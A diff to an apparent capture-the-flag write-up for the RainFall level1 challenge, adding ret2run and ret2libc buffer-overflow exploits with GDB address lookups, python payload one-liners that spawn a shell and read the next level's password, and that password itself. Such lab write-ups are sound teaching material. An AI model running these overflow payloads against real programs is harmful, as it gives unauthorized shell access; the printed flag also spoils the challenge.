@@ -40,7 +40,10 @@ The buffer is 64 bytes long. Therefore, passing more than 64 bytes to the progra
 
 Anything written beyond those 76 bytes (64 bytes of buffer + 12 bytes to reach the return address) will be treated as an address (only the 4 next bytes) and jumped to by the `ret` instruction of the `main` function.
 
-Now, we need to find the address of the `run` function, which spawns a shell, to jump to it:
+There's different ways to solve this challenge, we'll see two of them. First the intended way (I assume) with a ret to the run function and then the ret2libc way.
+
+### Ret2run
+So, we need to find the address of the `run` function, which spawns a shell, to jump to it:
 ```
 (gdb) info function run
 All functions matching regular expression "run":
@@ -51,8 +54,64 @@ Non-debugging symbols:
 
 Let's craft our payload:
 ```bash
+padding + address of run
+
+"\x90"*76 + "\x08\x04\x84\x44"
+```
+
+Let's run it:
+```bash
 level1@RainFall:~$ (python -c 'print("0"*76 + "\x08\x04\x84\x44"[::-1])' && echo 'cat /home/user/level2/.pass') | ./level1
 Good... Wait what?
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+```
+
+Perfect, let's move to the other solution.
+
+### Ret2libc
+Ret2Libc (Return-to-Libc) is an exploit technique that redirects the program flow to execute existing library functions.
+
+A typical Ret2Libc exploit is constructed as follows:
+```
+padding + address of system + address of exit + address of "/bin/sh"
+
+The address of exit is actually optional, but not providing it will cause the program to crash after executing the system function.
+```
+
+We, therefore, need the addresses of the `system`, `exit` functions and the string `/bin/sh` in memory. These are found using GDB:
+
+```bash
+# System
+(gdb) info function system
+0x08048360  system
+0x08048360  system@plt
+
+# Exit
+(gdb) info function exit
+0xb7e5ebe0  exit
+0xb7e5ec10  on_exit
+
+# /bin/sh
+(gdb) info proc mappings
+[...]
+0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+[...]
+(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
+0xb7f8cc58
+1 pattern found.
+```
+
+Alright, let's craft our payload:
+```
+reminder: padding + address of system + address of exit + address of "/bin/sh"
+
+"\x90"*76 + "\x08\x04\x83\x60" + "\xb7\xe5\xeb\xe0" + "\xb7\xf8\xcc\x58"
+```
+
+Let's run it:
+```bash
+level1@RainFall:~$ (python -c 'print("0"*76 + "\x08\x04\x83\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[:
+:-1])' && echo 'cat /home/user/level2/.pass') | ./level1
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
 
